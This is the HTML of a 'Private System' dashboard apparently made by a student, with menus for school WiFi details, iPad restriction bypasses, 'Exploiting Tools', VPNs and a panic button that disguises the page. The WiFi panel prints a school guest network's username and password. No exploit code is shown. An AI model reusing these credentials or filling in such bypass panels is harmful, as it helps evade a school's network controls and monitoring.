<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Private System</title>
  <script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>
  <!-- Include interact.js for drag and drop/resize -->
  <script src="https://cdn.jsdelivr.net/npm/interactjs/dist/interact.min.js"></script>
  <style>
    /* Basic Reset & Body Styles */
    * {
      box-sizing: border-box;
      font-family: 'Segoe UI', sans-serif; /* Default font */
      margin: 0; padding: 0;
    }
    body { /* Base body styles for all states */
      overflow: hidden; /* Prevent body scrollbars unless intentionally enabled */
      position: relative;
    }

    /* Login Screen Styles */
    body.login-body {
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      background: linear-gradient(135deg, #d16ba5 0%, #c777b9 25%, #ba83ca 50%, #aa8fd8 75%, #9a9ae1 100%); /* Dynamic background gradient */
      background-size: 400% 400%;
      animation: gradientAnimation 15s ease infinite;
    }
    @keyframes gradientAnimation {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }

    /* Pre-Login Overlay for initial animations */
    #preLoginOverlay {
        position: fixed;
        top: 0; left: 0; width: 100%; height: 100vh;
        background: rgba(0, 0, 0, 0.95); /* Dark, slightly transparent background */
        display: flex; flex-direction: column; justify-content: center; align-items: center;
        z-index: 999; /* High z-index to ensure it's on top */
        opacity: 1;
        visibility: visible;
        transition: opacity 1.5s ease-in-out, visibility 1.5s ease-in-out;
    }
    #preLoginOverlay.fade-out {
        opacity: 0;
        visibility: hidden;
    }

    /* Animation elements within the overlay */
    .rotating-box {
        width: 150px; height: 150px;
        border: 5px solid;
        border-radius: 50%;
        animation: rotate 8s infinite linear, colorGradient 4s infinite alternate ease-in-out;
        margin-bottom: 20px;
        border-image: linear-gradient(45deg, orange, red) 1; /* Initial gradient border */
    }
    @keyframes rotate {
        from { transform: rotateY(0deg) rotateX(10deg); } /* Subtle 3D tilt */
        to { transform: rotateY(360deg) rotateX(10deg); }
    }
    @keyframes colorGradient {
        0% { border-image-source: linear-gradient(45deg, orange, red); }
        50% { border-image-source: linear-gradient(45deg, red, deeppink); }
        100% { border-image-source: linear-gradient(45deg, deeppink, orange); }
    }
    .animated-text {
        font-size: 1.7em; font-weight: bold; font-family: 'Courier New', monospace;
        background: linear-gradient(45deg, orange, red);
        -webkit-background-clip: text; color: transparent;
        animation: pulseText 3s infinite alternate ease-in-out;
        transform-origin: center;
    }
    @keyframes pulseText {
        0% { transform: scale(1); opacity: 1; }
        100% { transform: scale(1.1); opacity: 0.8; }
    }
    .login-animation-box { /* 3D box animation */
        width: 150px; height: 150px;
        transform-style: preserve-3d;
        animation: spinCube 6s infinite linear;
        margin-top: 30px;
        perspective: 800px; /* For 3D effect */
        display: flex; justify-content: center; align-items: center;
    }
    @keyframes spinCube {
        0% { transform: rotateX(0deg) rotateY(0deg) scale(0.9); }
        50% { transform: rotateX(180deg) rotateY(180deg) scale(1.05); }
        100% { transform: rotateX(360deg) rotateY(360deg) scale(0.9); }
    }
    .login-animated-text {
        position: absolute; width: 100%; height: 100%;
        display: flex; justify-content: center; align-items: center;
        background: radial-gradient(circle, rgba(255,145,77,0.3) 0%, rgba(255,145,77,0) 70%); /* Soft glow */
        border: 2px solid rgba(255, 145, 77, 0.8); border-radius: 20px;
        font-family: 'Courier New', monospace; font-size: 1.1em; font-weight: bold; text-align: center;
        box-shadow: 0 0 20px rgba(255, 145, 77, 0.5);
        backface-visibility: hidden; color: #ffdfbf; letter-spacing: 0.5px;
    }

    /* Login Box Styling */
    .login-box {
      background: rgba(0, 0, 0, 0.7); border-radius: 25px; border: 3px solid rgba(255, 255, 255, 0.8);
      box-shadow: 0 0 20px rgba(255, 255, 255, 0.5);
      width: 400px; padding: 40px 30px; text-align: center;
      position: relative;
      transition: border-color 0.3s, box-shadow 0.3s, transform 0.3s ease-in-out;
      margin-top: 100px; /* Space for quick bar */
      backdrop-filter: blur(5px); /* Frosted glass effect */
      z-index: 1;
    }
    .login-box:hover {
        box-shadow: 0 0 30px rgba(255, 145, 77, 0.7); transform: translateY(-5px);
    }
    .login-box.flashing { animation: flashRed 0.4s ease-in-out 2; }
    @keyframes flashRed { 0%, 100% { border-color: red; box-shadow: 0 0 15px red; } 50% { border-color: white; box-shadow: 0 0 5px white; } }
    .login-box h2 {
      font-size: 2em; margin-bottom: 25px; font-family: 'Courier New', monospace;
      color: #ffbf80; letter-spacing: 1px; text-shadow: 0 0 10px rgba(255, 191, 128, 0.5);
    }
    .login-box input {
      width: 100%; padding: 15px; margin-bottom: 20px;
      background: rgba(28, 28, 28, 0.8); border: 1px solid rgba(255, 255, 255, 0.3); color: white;
      border-radius: 10px; font-size: 1em;
      transition: background 0.2s, border-color 0.2s, box-shadow 0.2s;
    }
    .login-box input:focus {
      background: rgba(28, 28, 28, 0.95); border-color: #ff914d; box-shadow: 0 0 12px rgba(255, 145, 77, 0.4); outline: none;
    }
    .login-box label { /* Custom toggle switch wrapper */
      display: flex; align-items: center; font-size: 0.9em; margin-bottom: 15px; gap: 10px; cursor: pointer;
      width: 100%; justify-content: center;
    }
    #showPasswordCheckbox { display: none; } /* Hide actual checkbox */
    /* Custom toggle switch */
    .toggle-switch {
      position: relative; display: inline-block; width: 45px; height: 25px;
      background-color: #ccc; border-radius: 25px; transition: background-color 0.3s; cursor: pointer;
    }
    .toggle-switch::after { /* Thumb */
      content: ''; position: absolute; top: 3px; left: 3px; width: 19px; height: 19px;
      background-color: white; border-radius: 50%; transition: transform 0.3s; box-shadow: 0 2px 5px rgba(0,0,0,0.2);
    }
    #showPasswordCheckbox:checked + .toggle-switch { background-color: #4CAF50; }
    #showPasswordCheckbox:checked + .toggle-switch::after { transform: translateX(20px); }
    .login-box label span { color: #eee; font-weight: 500; }
    #showPasswordCheckbox:checked + .toggle-switch + span { color: #4CAF50; }
    
    .login-box button {
      width: 100%; padding: 15px; background-color: #ff5a5a; color: white;
      font-size: 1.1em; border: none; border-radius: 10px; cursor: pointer;
      transition: background 0.2s, transform 0.1s, box-shadow 0.2s;
      margin-top: 5px; box-shadow: 0 5px 15px rgba(255, 90, 90, 0.4);
    }
    .login-box button:hover {
      background-color: #e64d4d; transform: translateY(-2px); box-shadow: 0 7px 20px rgba(255, 90, 90, 0.6);
    }
    .attempt-counter, .error-message {
      margin-top: 15px; font-size: 0.9em; color: #ff5a5a; min-height: 1.2em;
    }
    
    /* Reset Popup */
    .popup {
      position: absolute; top: 50%; left: 50%; width: 350px; padding: 30px;
      background: rgba(15, 15, 15, 0.9); border: 3px solid #ff914d; border-radius: 15px;
      box-shadow: 0 0 25px rgba(255, 145, 77, 0.6); z-index: 10;
      backdrop-filter: blur(8px); /* Frosted glass */
    }
    .popup p { margin-bottom: 20px; font-size: 1.1em; color: #ffddcc; }
    .popup input { width: 100%; padding: 12px; margin-bottom: 15px; border-radius: 8px; background: rgba(30,30,30,0.8); border: 1px solid #555; color: white; }
    .popup button { width: 100%; padding: 12px; background-color: #4CAF50; color: white; border: none; border-radius: 8px; cursor: pointer; transition: background 0.2s; }
    .popup button:hover { background-color: #45a049; }

    /* Login Quick Bar */
    .login-quick-bar {
      position: fixed; top: 0; left: 0; width: 100%;
      background-color: rgba(0, 0, 0, 0.6); padding: 12px 20px;
      display: flex; justify-content: space-between; align-items: center; gap: 15px;
      z-index: 100; border-bottom: 1px solid rgba(255, 255, 255, 0.2);
      flex-wrap: wrap; backdrop-filter: blur(3px); /* Frosted glass */
    }
    .login-quick-bar .left-side, .login-quick-bar .right-side, .login-quick-bar .center-items {
      display: flex; align-items: center; gap: 15px;
    }
    .login-quick-bar button {
      background: none; border: none; color: white; font-size: 1em; cursor: pointer;
      padding: 8px 12px; border-radius: 8px; transition: background 0.2s, transform 0.1s;
      font-weight: 500; font-family: 'Segoe UI', sans-serif;
    }
    .login-quick-bar button:hover { background: rgba(255, 255, 255, 0.2); transform: translateY(-1px); }
    .login-quick-bar button:active { transform: translateY(0); }
    .login-time-date {
      font-size: 0.95em; font-weight: bold; font-family: 'Courier New', monospace; white-space: nowrap;
      padding: 6px 10px; border-radius: 6px; background: rgba(0,0,0,0.3); color: #ffdbbf;
    }
    #loginPanicBtn { color: #ff4c4c; font-weight: bold; padding: 8px 15px; background: rgba(255,76,76,0.1); }
    #loginPanicBtn:hover { background: rgba(255,76,76,0.3); }
    #loginZoomInBtn, #loginZoomOutBtn { font-weight: bold; color: #fff; }
    #loginAttemptCounterDisplay {
      cursor: default; color: #ff5a5a; font-weight: bold;
      border: 1px solid rgba(255,90,90,0.4); padding: 6px 10px; background: rgba(255,90,90,0.1);
    }
    #loginAttemptCounterDisplay:hover { background: rgba(255,90,90,0.3); }
    #passwordToggleBtn { font-size: 1.3em; color: #fff; }
    #timeFormatToggleBtn { font-size: 0.95em; color: #fff; }

    /* Dashboard Styles */
    @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&display=swap');
    body.dashboard-body {
      font-family: 'Montserrat', sans-serif;
      background: linear-gradient(217deg, #e0c3fc 0%, #8ec5fc 75%); /* Softer dashboard background */
      background-size: 400% 400%;
      animation: dashboardGradient 25s ease infinite;
      overflow-y: auto; /* Enable scrolling */
      position: relative;
      padding: 20px;
    }
    @keyframes dashboardGradient {
      0% { background-position: 0% 0%; }
      50% { background-position: 100% 100%; }
      100% { background-position: 0% 0%; }
    }
    body.dashboard-body.light-theme {
      background: #f9f2dc; /* Light, creamy background */
      animation: none;
    }
    body.dashboard-body.light-theme .dashboard-header { background-color: #ffd966; color: #000; }
    body.dashboard-body.light-theme .quick-bar { background-color: rgba(255, 217, 102, 0.5); }
    body.dashboard-body.light-theme .box { background-color: #fff3cc; color: #000; box-shadow: 0 0 15px rgba(255, 200, 100, 0.6); }
    body.dashboard-body.light-theme .box h2 { color: #994d00; }
    body.dashboard-body.light-theme .motivation-box { background-color: #fff7e6; color: #663300; box-shadow: 0 0 12px rgba(255, 200, 100, 0.8); }
    
    .dashboard-header {
      display: flex; justify-content: space-between; align-items: center;
      background: #ff914d; padding: 15px 25px; border-radius: 12px; color: #000;
      margin-bottom: 20px; box-shadow: 0 5px 15px rgba(255, 145, 77, 0.4);
    }
    .dashboard-header h1 { font-size: 2.2em; margin: 0; font-family: 'Montserrat', sans-serif; }
    .user-info { font-weight: bold; font-size: 1em; color: #fff; }
    .user-info span { color: #ffe0cc; }
    .version-box {
      background: #ffd966; padding: 8px 15px; border-radius: 8px; color: #000; font-weight: bold;
      font-family: 'Courier New', monospace;
    }

    /* Quick Bar for Dashboard */
    .quick-bar {
      display: flex; justify-content: center; gap: 12px; margin-bottom: 10px; flex-wrap: wrap;
      padding: 12px; background: rgba(42, 42, 42, 0.7); border-radius: 10px;
      box-shadow: inset 0 0 10px rgba(0,0,0,0.3);
    }
    body.dashboard-body.light-theme .quick-bar { background: rgba(255, 217, 102, 0.7); }
    .quick-bar button {
      background-color: #ff914d; border: none; padding: 10px 16px; border-radius: 8px;
      color: black; font-weight: bold; cursor: pointer; transition: background 0.2s, transform 0.1s, box-shadow 0.2s;
      min-width: 110px; white-space: nowrap; font-family: 'Montserrat', sans-serif; font-size: 0.9em;
    }
    .quick-bar button:hover {
      background-color: #ffb67a; transform: translateY(-2px); box-shadow: 0 4px 10px rgba(255, 145, 77, 0.4);
    }
    #panicBtn { background: #ff4c4c !important; color: white !important; border: 1px solid rgba(255,76,76,0.3); }
    #panicBtn:hover { background: #e64c4c !important; box-shadow: 0 4px 10px rgba(255,76,76,0.4); }
    
    /* Search Bar in Quick Bar */
    .quick-bar input[type="text"] {
      padding: 10px 12px; border-radius: 8px; border: 1px solid #ff914d;
      background: rgba(255, 255, 255, 0.2); color: #f9f2dc; font-size: 0.9em; width: 180px;
      transition: border-color 0.2s, background 0.2s, box-shadow 0.2s; font-family: 'Montserrat', sans-serif;
    }
    body.dashboard-body.light-theme .quick-bar input[type="text"] { border-color: #994d00; background: rgba(255, 255, 255, 0.7); color: #000; }
    .quick-bar input[type="text"]::placeholder { color: rgba(249, 242, 220, 0.7); }
    body.dashboard-body.light-theme .quick-bar input[type="text"]::placeholder { color: rgba(0, 0, 0, 0.7); }
    .quick-bar input[type="text"]:focus {
      border-color: #ffbf80; background: rgba(255, 255, 255, 0.4); box-shadow: 0 0 12px rgba(255, 178, 102, 0.4); outline: none;
    }

    .announcement-bar {
      width: 100%; background-color: #ff914d; color: black; font-weight: bold;
      padding: 10px 0; overflow: hidden; position: relative; border-radius: 8px;
      box-sizing: border-box; margin-bottom: 20px; user-select: none; height: 30px; line-height: 13px;
      text-align: center; box-shadow: 0 2px 8px rgba(255, 145, 77, 0.3);
    }
    .announcement-bar span {
      display: inline-block; white-space: nowrap; position: absolute;
      will-change: transform; animation: scrollLeft 15s linear infinite;
      padding-left: 100%; font-size: 0.9em;
    }
    @keyframes scrollLeft { 0% { transform: translateX(0%); } 100% { transform: translateX(-100%); } }
    body.dashboard-body.light-theme .announcement-bar { background-color: #ffd966; color: #000; }

    /* Main content layout with draggable panels */
    .main-row {
      display: flex; gap: 20px; margin-bottom: 20px; flex-wrap: wrap;
    }
    .box {
      background-color: #2a2a2a; padding: 20px; border-radius: 12px;
      box-shadow: 0 0 15px rgba(255, 145, 77, 0.3); min-height: 120px;
      transition: background-color 0.3s, color 0.3s, transform 0.2s, box-shadow 0.2s;
      flex: 1 1 300px; position: relative; /* Crucial for panel handles */
    }
    body.dashboard-body.light-theme .box { background-color: #ffd966; color: #000; box-shadow: 0 0 15px rgba(255, 145, 77, 0.6); }
    .box h2 {
      font-size: 1.1em; margin-top: 0; margin-bottom: 10px; color: #ffbf80; font-family: 'Montserrat', sans-serif;
    }
    body.dashboard-body.light-theme .box h2 { color: #994d00; }
    .box p, .box ul { font-size: 0.9em; }
    
    /* Resizable Handle Styles */
    .handle {
      position: absolute; bottom: 5px; right: 5px; width: 18px; height: 18px;
      background: #ff914d; border-radius: 4px; cursor: se-resize; opacity: 0.7;
      z-index: 5; display: flex; justify-content: center; align-items: center;
      transition: opacity 0.2s, background 0.2s; border: 1px solid rgba(255,255,255,0.3);
    }
    .handle::after { content: '\2518'; color: black; font-size: 0.8em; }
    .handle:hover { opacity: 1; background: #ffb67a; border-color: rgba(255,255,255,0.5); }
    body.dashboard-body.light-theme .handle { background: #994d00; }
    body.dashboard-body.light-theme .handle:hover { background: #e68a00; border-color: rgba(255,255,255,0.7); }
    
    /* Specific Panels */
    .info-panel {
      display: none; background-color: #2a2a2a; padding: 20px; border-radius: 12px; margin-top: 20px;
      box-shadow: 0 0 15px rgba(255, 145, 77, 0.3);
    }
    body.dashboard-body.light-theme .info-panel { background-color: #ffd966; color: #000; }
    .info-panel h2 { color: #ff914d; margin-bottom: 15px; font-size: 1.4em; font-family: 'Montserrat', sans-serif; }
    body.dashboard-body.light-theme .info-panel h2 { color: #994d00; }

    /* WiFi Panel Specifics */
    .wifi-grid, .wifi-entry { display: grid; grid-template-columns: repeat(8, 1fr); gap: 10px; margin-bottom: 15px; }
    .wifi-grid div { padding: 8px; background: #333; border-radius: 6px; text-align: center; font-weight: bold; }
    body.dashboard-body.light-theme .wifi-grid div { background: #ffd999; }
    .wifi-entry div { padding: 8px; background: #40210f; border-radius: 6px; text-align: center; }
    body.dashboard-body.light-theme .wifi-entry div { background: #ffd999; }
    .wifi-level-high { background-color: #76c876 !important; color: #1a1a1a !important; } /* Green */
    .wifi-level-medium { background-color: #ffd700 !important; color: #1a1a1a !important; } /* Gold */
    .wifi-level-low { background-color: #ff6347 !important; color: white !important; } /* Tomato Red */
    .wifi-level-unknown { background-color: #555 !important; color: white !important; }
    body.dashboard-body.light-theme .wifi-level-unknown { background-color: #ccc !important; color: black !important;}

    /* Links & Buttons common styles */
    .links-list a, .handbook-buttons button, .exploit-buttons a, .bypass-buttons button {
      display: block; background-color: #ff914d; border: none; padding: 12px; border-radius: 8px;
      color: black; font-weight: bold; cursor: pointer; transition: background 0.2s; text-align: center;
      font-family: 'Montserrat', sans-serif; font-size: 0.9em;
    }
    .links-list a:hover, .handbook-buttons button:hover, .exploit-buttons a:hover, .bypass-buttons button:hover {
      background-color: #ffb67a;
    }
    body.dashboard-body.light-theme .links-list a, body.dashboard-body.light-theme .handbook-buttons button, 
    body.dashboard-body.light-theme .exploit-buttons a, body.dashboard-body.light-theme .bypass-buttons button {
      background-color: #ffd966; color: #000;
    }
    body.dashboard-body.light-theme .links-list a:hover, body.dashboard-body.light-theme .handbook-buttons button:hover,
    body.dashboard-body.light-theme .exploit-buttons a:hover, body.dashboard-body.light-theme .bypass-buttons button:hover {
      background-color: #ffd5a6;
    }
    
    /* Specific panel styles */
    .coming-soon { background: #40210f; padding: 15px; border-radius: 8px; margin-top: 15px; text-align: center; font-weight: bold; }
    body.dashboard-body.light-theme .coming-soon { background: #ffd999; }
    .info-text { background: #40210f; padding: 15px; border-radius: 8px; margin-top: 15px; }
    body.dashboard-body.light-theme .info-text { background: #ffd999; }
    .school-info-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; margin-top: 15px; }
    .school-info-item { background: #40210f; padding: 12px; border-radius: 8px; }
    body.dashboard-body.light-theme .school-info-item { background: #ffd999; }
    .school-info-label { font-weight: bold; color: #ff914d; margin-bottom: 5px; }
    body.dashboard-body.light-theme .school-info-label { color: #994d00; }

    /* New Panels - Overlay Style */
    #settingsPanel, #factsPanel, #quotesPanel, #activityLogDisplay, #loginHistoryDisplay {
      display: none; background-color: #2a2a2a; padding: 20px; border-radius: 12px; margin-top: 20px;
      box-shadow: 0 0 15px rgba(255, 145, 77, 0.3);
      position: fixed; top: 10%; left: 50%; transform: translateX(-50%); /* Center panel */
      width: 70%; height: 75%; z-index: 1000; overflow-y: auto;
    }
    body.dashboard-body.light-theme #settingsPanel, body.dashboard-body.light-theme #factsPanel,
    body.dashboard-body.light-theme #quotesPanel, body.dashboard-body.light-theme #activityLogDisplay,
    body.dashboard-body.light-theme #loginHistoryDisplay { background-color: #ffd966; color: #000; }
    #settingsPanel h2, #factsPanel h2, #quotesPanel h2, #activityLogDisplay h2, #loginHistoryDisplay h2 {
      color: #ff914d; margin-bottom: 15px; font-size: 1.4em; font-family: 'Montserrat', sans-serif;
    }
    body.dashboard-body.light-theme #settingsPanel h2, body.dashboard-body.light-theme #factsPanel h2,
    body.dashboard-body.light-theme #quotesPanel h2, body.dashboard-body.light-theme #activityLogDisplay h2,
    body.dashboard-body.light-theme #loginHistoryDisplay h2 { color: #994d00; }
    
    /* Setting Option Button Style */
    .setting-option {
      display: block; width: calc(33.333% - 10px); margin: 5px; padding: 12px;
      background-color: #673ab7; /* Deep Purple */ color: white; border: none; border-radius: 8px;
      font-weight: bold; cursor: pointer; text-align: center; font-family: 'Montserrat', sans-serif; font-size: 0.9em;
      transition: background 0.2s, transform 0.1s;
    }
    .setting-option:hover { background-color: #512da8; transform: translateY(-1px); }
    body.dashboard-body.light-theme .setting-option { background-color: #87ceeb; color: #000; } /* Sky Blue */
    body.dashboard-body.light-theme .setting-option:hover { background-color: #4682B4; } /* Steel Blue */

    /* Stats, Media, Reminder buttons */
    #statsBtn { background-color: #2196f3; color: white; } /* Blue */
    #statsBtn:hover { background-color: #1976d2; }
    body.dashboard-body.light-theme #statsBtn { background-color: #add8e6; color: #000; } /* Light Blue */
    body.dashboard-body.light-theme #statsBtn:hover { background-color: #87ceeb; }
    #mediaBtn { background-color: #e91e63; color: white; } /* Pink */
    #mediaBtn:hover { background-color: #c2185b; }
    body.dashboard-body.light-theme #mediaBtn { background-color: #ffdab9; color: #8b4513; } /* Navajo White */
    body.dashboard-body.light-theme #mediaBtn:hover { background-color: #ffc17f; }
    #reminderBtn { background-color: #00bcd4; color: white; } /* Cyan */
    #reminderBtn:hover { background-color: #0097a9; }
    body.dashboard-body.light-theme #reminderBtn { background-color: #afeeee; color: #000; } /* Pale Turquoise */
    body.dashboard-body.light-theme #reminderBtn:hover { background-color: #7fffd4; } /* Aquamarine */

    /* Calculator/Unit Converter */
    #calculatorBtn, #unitConverterBtn { background-color: #ff9800; color: #fff; } /* Orange */
    #calculatorBtn:hover, #unitConverterBtn:hover { background-color: #f57c00; }
    body.dashboard-body.light-theme #calculatorBtn, body.dashboard-body.light-theme #unitConverterBtn { background-color: #ffecb3; color: #000; }
    body.dashboard-body.light-theme #calculatorBtn:hover, body.dashboard-body.light-theme #unitConverterBtn:hover { background-color: #ffe082; }
    
    /* New quick bar button generic style */
    .quick-bar button[id$='Btn'] { background-color: #5E3A8D; } /* Dark Purple */
    .quick-bar button[id$='Btn']:hover { background-color: #7c4da7; }
    body.dashboard-body.light-theme .quick-bar button[id$='Btn'] { background-color: #ffe0cc; color: #4b1d00; }
    body.dashboard-body.light-theme .quick-bar button[id$='Btn']:hover { background-color: #ffd1a5; }

    /* Activity Log Display */
    #activityLogDisplay { padding-top: 30px; } /* Space for close button */
    #activityLogList { list-style: none; margin: 0; padding: 0; }
    #activityLogList li { margin-bottom: 10px; padding-bottom: 5px; border-bottom: 1px dashed #555; font-size: 0.9em; word-break: break-word; }
    #activityLogDisplay .close-panel-btn { /* Style for close button within panels */
        position: absolute; top: 15px; right: 15px;
        background: #ff5a5a; color: white; border: none; padding: 8px 16px;
        border-radius: 6px; cursor: pointer; font-size: 0.9em; font-family: 'Montserrat', sans-serif;
        transition: background 0.2s;
    }
    #activityLogDisplay .close-panel-btn:hover { background: #e64d4d; }
    body.dashboard-body.light-theme #activityLogDisplay .close-panel-btn { background: #ff5a5a; }
    body.dashboard-body.light-theme #activityLogDisplay .close-panel-btn:hover { background: #e64d4d; }

  </style>
</head>
<body class="login-body" id="bodyElement">

  <!-- Pre-Login Loading Overlay -->
  <div id="preLoginOverlay">
      <div class="rotating-box"></div>
      <div class="animated-text">Initializing System...</div>
      <div class="login-animation-box">
          <div class="login-animated-text">Initializing Login Page...</div>
      </div>
  </div>

  <!-- Login System -->
  <div class="login-box" id="loginBox" style="display: none;"> <!-- Hidden initially -->
    <h2>𝙋𝙧𝙞𝙫𝙖𝙩𝙚 𝙎𝙮𝙨𝙩𝙚𝙢</h2>

    <input type="text" id="username" placeholder="Enter Username..." autocomplete="off" />
    <input type="password" id="password" placeholder="Enter Password..." autocomplete="off" />
    <input type="text" id="userID" placeholder="Enter User Identifier..." autocomplete="off" />

    <label for="showPasswordCheckbox">
      <input type="checkbox" id="showPasswordCheckbox" />
      <span class="toggle-switch"></span> <!-- Custom toggle switch -->
      <span>Show Password</span>
    </label>

    <button id="submitBtn">Submit</button>

    <div class="error-message" id="errorMsg"></div>
    <div class="attempt-counter" id="attemptsText">Attempts Left: 3</div> <!-- Updated to 3 attempts -->

    <!-- Password Reset Popup -->
    <div class="popup" id="resetPopup" tabindex="-1" aria-hidden="true">
      <p>Too many failed attempts.</p>
      <input type="password" id="resetField" placeholder="Enter reset code..." autocomplete="off" />
      <button id="resetBtn">Reset Counter</button>
    </div>
  </div>

  <!-- Login Quick Bar -->
  <div class="login-quick-bar">
      <div class="left-side">
          <button id="loginPanicBtn" title="Go to Clever Login">🚨 Clever</button>
          <button id="loginZoomInBtn" title="Zoom In">➕ Zoom In</button>
          <button id="loginZoomOutBtn" title="Zoom Out">➖ Zoom Out</button>
      </div>
      <div class="center-items">
          <div class="login-time-date" id="loginDateTimeBox">📅 --.--.-- 🕒 --:--:--</div>
          <button id="timeFormatToggleBtn" title="Toggle 24h format">🔄 12h</button>
          <button id="passwordToggleBtn" title="Show/Hide Password">👁️</button>
      </div>
      <div class="right-side">
          <button id="loginAttemptCounterDisplay">Attempts: 3</button>
      </div>
  </div>

  <!-- Dashboard Area -->
  <div id="dashboard" style="display: none;">
    <div class="dashboard-header" id="dashboardHeader">
      <div>
        <h1>Private Dashboard GUI</h1>
        <div class="user-info">User - <span id="loggedInUser">Guest</span> | ID: <span id="loggedInID">000000</span></div>
      </div>
      <div class="version-box">Version 1.5.6</div>
    </div>

    <div class="quick-bar">
      <button id="sessionTime">⏳ Session Time: 00:00:00</button>
      <button id="realTimeClock">🕒 --:--:--</button>
      <button id="realDate">📅 --</button>
      <button id="notesBtn">📒 Notes</button>
      <button id="exportNotesBtn">💾 Export Notes</button>
      <button id="downloadActivityLogsBtn">💾 Activity Logs</button>
      <button id="screenshotBtn">📸 Screenshot</button>
      <button id="toggleSectionsBtn">⬆️ Toggle Sections</button>
      <button id="fixIssuesBtn">🛠️ Fix Issues</button>
      <button id="fullScreenBtn">🖥️ Full Screen</button>
      <button id="zoomInBtn">➕ Zoom In</button>
      <button id="zoomOutBtn">➖ Zoom Out</button>
      <button id="restartBtn">🔄 Restart</button>
      <button id="panicBtn">🚨 Panic</button>
      <button id="themeToggle">🌙 Dark Mode</button>
      <button id="logoutBtn">🔓 Log Out</button>
      <input type="text" id="dashboardSearch" placeholder="Search areas..." autocomplete="off"/>
    </div>
    
    <div id="announcementBar" class="announcement-bar">
      <span>🚨 Welcome to the Private Dashboard GUI. Stay tuned for updates and alerts! 🚨</span>
    </div>
    
    <!-- Main Gridded Content Panels -->
    <div class="main-row" id="mainGrid">
      
      <div class="box" data-panel-id="calendar"> <!-- data-panel-id for easier search -->
        <h2>📅 Calendar</h2>
        <div class="calendar" id="calendar"></div>
      </div>

      <div class="box motivation-box" id="motivationBox" data-panel-id="motivation">
        "Success is not final, failure is not fatal: It is the courage to continue that counts." – Winston Churchill
      </div>
    </div>

    <!-- Updates and Notifications Panels -->
    <div id="updatesNotifications" style="display: flex; gap: 20px; justify-content: center; flex-wrap: wrap; margin-top: 20px;">
      <div class="box" style="flex: 1 1 300px; min-width: 280px;" data-panel-id="updates">
        <h2>🔄 Updates</h2>
        <div class="update-entry">Dashboard Interface Update!</div>
        <div class="update-entry">New Exploits Added</div>
        <div class="update-entry">UI Overhaul Deployed</div>
      </div>

      <div class="box" style="flex: 1 1 300px; min-width: 280px;" data-panel-id="notifications">
        <h2>🔔 Notifications</h2>
        <p>Starting to work on the log in system. Stay tuned for more!</p>
      </div>
    </div>

    <!-- Panel Toggle Buttons -->
    <div class="quick-bar" style="flex-wrap: wrap; margin-top: 30px;">
      <button onclick="dashboard.togglePanel('wifiPanel')">📡 WiFi Info</button>
      <button onclick="dashboard.togglePanel('ipadPanel')">📱 iPad Restrictions</button>
      <button onclick="dashboard.togglePanel('handbookPanel')">📘 Handbooks</button>
      <button onclick="dashboard.togglePanel('mapPanel')">🏫 Building Map</button>
      <button onclick="dashboard.togglePanel('studentWebsitesPanel')">🌐 Student Websites</button>
      <button onclick="dashboard.togglePanel('teacherWebsitesPanel')">👩‍🏫 Teacher Websites</button>
      <button onclick="dashboard.togglePanel('phoneDirectoryPanel')">📞 Phone Directory</button>
      <button onclick="dashboard.togglePanel('cameraPanel')">📷 Camera Info</button>
      <button onclick="dashboard.togglePanel('schoolInfoPanel')">🏫 School Info</button>
      <button onclick="dashboard.togglePanel('exploitPanel')">🧨 Exploiting Tools</button>
      <button onclick="dashboard.togglePanel('bypassPanel')">🚪 Bypassing Tools</button>
      <button onclick="dashboard.togglePanel('vpnPanel')">🔐 VPN Websites</button>
      <button onclick="dashboard.togglePanel('gamingPanel')">🎮 Gaming Websites</button>
      <button onclick="dashboard.togglePanel('musicPanel')">🎵 Music Websites</button>
      <button onclick="dashboard.togglePanel('keyboardPanel')">🎹 Keyboard Tricks</button>
      <!-- New Utility Panels/Buttons -->
      <button onclick="dashboard.togglePanel('settingsPanel')">⚙️ Settings</button>
      <button id="timerBtn">⏱️ Timer</button>
      <button id="stopwatchBtn">⏺️ Stopwatch</button>
      <button id="activityLogBtn">📜 Activity Log</button>
      <button id="loginHistoryBtn">👤 Login History</button>
      <button id="themesBtn">🎨 Themes</button>
      <button id="calculatorBtn">🧮 Calculator</button>
      <button id="unitConverterBtn">↔️ Unit Converter</button>
      <button id="statsBtn">📊 Stats</button>
      <button id="mediaBtn">📺 Media</button>
      <button id="reminderBtn">🔔 Reminder</button>
    </div>

    <!-- Detailed Information Panels Container -->
    <div id="infoPanelsContainer" style="margin-top: 20px;">
      
      <!-- WiFi Panel -->
      <div id="wifiPanel" class="info-panel">
        <h2>📡 School WiFi Information</h2>
        <div class="wifi-grid">
          <div>Network Name</div><div>Wifi Level</div><div>Security</div><div>Encryption</div><div>Hidden?</div><div>Monitored?</div><div>Username</div><div>Password</div>
        </div>
        <div class="wifi-entry">
          <div>Middletown_Core</div><div class="wifi-level-high">High</div><div>WPA3 Ent.</div><div>High</div><div>No</div><div>Yes</div><div>Unknown</div><div>Unknown</div>
        </div>
        <div class="wifi-entry">
          <div>Mtown_Core</div><div class="wifi-level-high">High</div><div>WPA3 Ent.</div><div>High</div><div>Yes</div><div>Unknown</div><div>Unknown</div><div>Unknown</div>
        </div>
        <div class="wifi-entry">
          <div>Mtown Guest</div><div class="wifi-level-medium">Medium</div><div>WPA3 Ent.</div><div>Medium</div><div>No</div><div>Rare</div><div>msguest</div><div>M@ms2021#</div>
        </div>
        <div class="wifi-entry">
          <div>Radius Test</div><div class="wifi-level-low">Low</div><div>WPA3 Ent.</div><div>Low</div><div>No</div><div>Rarely</div><div>msguest</div><div>M@ms2021#</div>
        </div>
      </div>

      <!-- iPad Restrictions Panel -->
      <div id="ipadPanel" class="info-panel">
        <h2>📱 School iPad Restrictions</h2>
        <div class="ipad-options">
          <button onclick="dashboard.showIpadContent('restrictions')">Restrictions</button>
          <button onclick="dashboard.showIpadContent('bypasses')">Bypasses</button>
        </div>
        <div id="ipadRestrictions" class="ipad-content"><p>Content loading...</p></div>
        <div id="ipadBypasses" class="ipad-content"><p>Content loading...</p></div>
      </div>

      <!-- Student Handbooks Panel -->
      <div id="handbookPanel" class="info-panel">
